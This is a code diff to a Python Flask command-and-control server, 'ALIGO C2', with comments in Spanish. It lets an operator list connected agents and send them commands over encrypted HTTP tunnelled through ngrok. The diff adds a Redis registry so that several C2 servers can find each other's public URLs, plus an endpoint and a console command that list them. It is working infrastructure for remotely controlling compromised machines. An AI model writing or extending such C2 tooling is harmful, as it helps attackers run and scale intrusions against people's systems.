@@ -1,10 +1,16 @@
 """
-Servidor C2 - HTTPS Version con Cifrado Híbrido
+Servidor C2 - HTTPS Version con Cifrado Híbrido + Redis Registry
 Acepta conexiones de múltiples agentes vía HTTP/HTTPS, permite al operador
 elegir un agente y mandarle comandos, recibe y muestra resultados.
 
 Protocolo: HTTP con JSON (REST API) + RSA-2048 + Fernet encryption.
 Compatible con ngrok: ngrok http 5000
+Redis: Registro automático de servidores para arquitectura distribuida
+
+USO:
+    python3 server.py              # Puerto 5000 (por defecto)
+    python3 server.py 5001         # Puerto 5001
+    python3 server.py 5002 server-C  # Puerto 5002, nombre server-C
 """
 
 from flask import Flask, request, jsonify
@@ -15,20 +21,71 @@ import os
 import sys
 import time
 from datetime import datetime
+import requests
 
 # Import crypto utilities
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
 from shared.crypto_utils import C2Crypto
 
+# Intentar importar Redis (opcional, no bloqueante)
+REDIS_AVAILABLE = False
+redis_client = None
+try:
+    import redis
+    REDIS_AVAILABLE = True
+except ImportError:
+    print("[!] Redis no disponible - servidor funcionará sin registro distribuido")
+    print("[*] Para habilitar Redis: pip install redis")
+
+# Configuración de puerto y nombre del servidor
+if len(sys.argv) >= 2:
+    try:
+        PORT = int(sys.argv[1])
+    except ValueError:
+        print(f"[!] Puerto inválido: {sys.argv[1]}")
+        sys.exit(1)
+else:
+    PORT = int(os.getenv("PORT", 5000))
+
+# Nombre del servidor (usado en Redis)
+if len(sys.argv) >= 3:
+    SERVER_NAME = sys.argv[2]
+else:
+    # Auto-determinar nombre basado en puerto
+    port_to_name = {
+        5000: "server-A",
+        5001: "server-B",
+        5002: "server-C"
+    }
+    SERVER_NAME = port_to_name.get(PORT, f"server-{PORT}")
+
 HOST = "0.0.0.0"
-PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de entorno
 
 app = Flask(__name__)
 app.config['JSON_SORT_KEYS'] = False
 
 # Cryptographic keys (RSA keypair for server)
 server_private_key, server_public_key = C2Crypto.generate_rsa_keypair()
-print(f"[*] Server RSA keypair generated (2048-bit)")
+
+# Redis configuration (si está disponible)
+REDIS_HOST = os.getenv("REDIS_HOST", "127.0.0.1")
+REDIS_PORT = int(os.getenv("REDIS_PORT", 6379))
+
+if REDIS_AVAILABLE:
+    try:
+        redis_client = redis.Redis(
+            host=REDIS_HOST, 
+            port=REDIS_PORT, 
+            decode_responses=True, 
+            socket_connect_timeout=3
+        )
+        redis_client.ping()
+        print(f"[✓] Conectado a Redis en {REDIS_HOST}:{REDIS_PORT}")
+    except Exception as e:
+        print(f"[!] Redis no disponible en {REDIS_HOST}:{REDIS_PORT}: {e}")
+        print(f"[*] Continuando sin Redis (modo standalone)")
+        REDIS_AVAILABLE = False
+        redis_client = None
 
 # Diccionario de agentes conectados: {agent_id: info}
 agents = {}
@@ -42,6 +99,9 @@ pending_commands = {}
 
 # Resultados recibidos (opcional, para debug)
 results_history = []
+
+# URL de ngrok actual
+current_ngrok_url = None
 
 
 # ============================================
@@ -191,9 +251,123 @@ def health():
     """Endpoint de salud para verificar que el servidor está vivo."""
     return jsonify({
         "status": "ok",
+        "server_name": SERVER_NAME,
         "agents_connected": len(agents),
+        "ngrok_url": current_ngrok_url,
         "timestamp": datetime.now().isoformat()
     })
+
+
+@app.route('/servers-list', methods=['GET'])
+def servers_list():
+    """Lista todos los servidores registrados en Redis."""
+    if not REDIS_AVAILABLE or not redis_client:
+        return jsonify({
+            "status": "error",
+            "message": "Redis not available"
+        }), 503
+    
+    try:
+        keys = redis_client.keys("server:*:ngrok_url")
+        servers = []
+        
+        for key in keys:
+            server_name = key.split(":")[1]
+            url = redis_client.get(key)
+            timestamp = redis_client.get(f"server:{server_name}:timestamp")
+            
+            if url:
+                servers.append({
+                    "name": server_name,
+                    "url": url,
+                    "timestamp": timestamp
+                })
+        
+        return jsonify({
+            "status": "ok",
+            "servers": servers,
+            "count": len(servers)
+        })
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "message": str(e)
+        }), 500
+
+
+# ============================================
+# FUNCIONES DE REGISTRO EN REDIS
+# ============================================
+
+def detect_ngrok_url():
+    """Detecta la URL de ngrok accediendo a localhost:4040."""
+    try:
+        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
+        tunnels = response.json().get('tunnels', [])
+        
+        for tunnel in tunnels:
+            # Buscar el tunnel HTTPS que apunte a nuestro puerto
+            if tunnel.get('proto') == 'https':
+                config = tunnel.get('config', {})
+                addr = config.get('addr', '')
+                # Verificar si el tunnel apunta a nuestro puerto
+                if f"localhost:{PORT}" in addr or f"127.0.0.1:{PORT}" in addr:
+                    return tunnel.get('public_url')
+    except:
+        pass
+    
+    return None
+
+
+def register_in_redis():
+    """Detecta URL ngrok y la registra en Redis periódicamente."""
+    global current_ngrok_url
+    
+    if not REDIS_AVAILABLE or not redis_client:
+        return
+    
+    while True:
+        try:
+            ngrok_url = detect_ngrok_url()
+            
+            if ngrok_url and ngrok_url != current_ngrok_url:
+                current_ngrok_url = ngrok_url
+                
+                # Registrar URL con TTL de 10 minutos
+                redis_client.setex(
+                    f"server:{SERVER_NAME}:ngrok_url",
+                    600,  # 10 minutos
+                    ngrok_url
+                )
+                
+                redis_client.setex(
+                    f"server:{SERVER_NAME}:timestamp",
+                    600,
+                    datetime.now().isoformat()
+                )
+                
+                print(f"\n[✓] Registrado en Redis: {SERVER_NAME} -> {ngrok_url}")
+                print("> ", end="", flush=True)
+            elif not ngrok_url:
+                # Si no detectamos ngrok, intentar registrar con IP local
+                local_url = f"http://{HOST}:{PORT}"
+                if current_ngrok_url != local_url:
+                    current_ngrok_url = local_url
+                    redis_client.setex(
+                        f"server:{SERVER_NAME}:ngrok_url",
+                        600,
+                        local_url
+                    )
+                    redis_client.setex(
+                        f"server:{SERVER_NAME}:timestamp",
+                        600,
+                        datetime.now().isoformat()
+                    )
+        
+        except Exception as e:
+            pass  # Silencioso para no interrumpir
+        
+        time.sleep(300)  # Cada 5 minutos
 
 
 # ============================================
@@ -204,6 +378,7 @@ def operator_console():
     """Consola interactiva para que el operador mande comandos."""
     print("Consola de operador. Comandos:")
     print("  list                  -> lista agentes conectados")
+    print("  servers               -> lista servidores en Redis")
     print("  use <agent_id> <cmd>  -> manda un comando a un agente")
     print("  use @agent <cmd>      -> usa el único agente (si solo hay uno)")
     print("  exit                  -> salir\n")
@@ -237,6 +412,26 @@ def operator_console():
                     for aid, info in active_agents.items():
                         last_seen = info['last_seen'].strftime("%H:%M:%S")
                         print(f" - {aid} | {info['hostname']} | {info['os']} | last_seen: {last_seen}")
+
+        elif line == "servers":
+            if not REDIS_AVAILABLE or not redis_client:
+                print("Redis no disponible")
+                continue
+            
+            try:
+                keys = redis_client.keys("server:*:ngrok_url")
+                if not keys:
+                    print("(sin servidores registrados en Redis)")
+                else:
+                    print(f"Servidores activos ({len(keys)}):")
+                    for key in keys:
+                        server_name = key.split(":")[1]
+                        url = redis_client.get(key)
+                        timestamp = redis_client.get(f"server:{server_name}:timestamp")
+                        status = "🟢" if server_name == SERVER_NAME else "⚪"
+                        print(f" {status} {server_name}: {url} ({timestamp})")
+            except Exception as e:
+                print(f"Error consultando Redis: {e}")
 
         elif line.startswith("use "):
             parts = line.split(" ", 2)
@@ -295,10 +490,16 @@ def operator_console():
 
 def main():
     print("=" * 60)
-    print("  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido")
+    print(f"  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido")
     print("=" * 60)
-    print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
+    print(f"[*] Servidor: {SERVER_NAME}")
+    print(f"[*] Puerto: {PORT}")
+    print(f"[*] Server RSA keypair generated (2048-bit)")
     print(f"[*] Cifrado: RSA-2048 + Fernet (AES-128-CBC)")
+    if REDIS_AVAILABLE and redis_client:
+        print(f"[*] Redis: {REDIS_HOST}:{REDIS_PORT} ✅")
+    else:
+        print(f"[*] Redis: Deshabilitado (modo standalone)")
     print(f"[*] Usa ngrok con: ngrok http {PORT}")
     print(f"[*] Los logs de Flask se muestran mezclados con la consola")
     print(f"[*] Esto es normal - los comandos funcionan correctamente")
@@ -324,6 +525,11 @@ def main():
     
     cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
     cleanup_thread.start()
+    
+    # Thread de registro en Redis (si está disponible)
+    if REDIS_AVAILABLE and redis_client:
+        redis_thread = threading.Thread(target=register_in_redis, daemon=True)
+        redis_thread.start()
     
     # Iniciar Flask en un thread separado
     def run_flask():
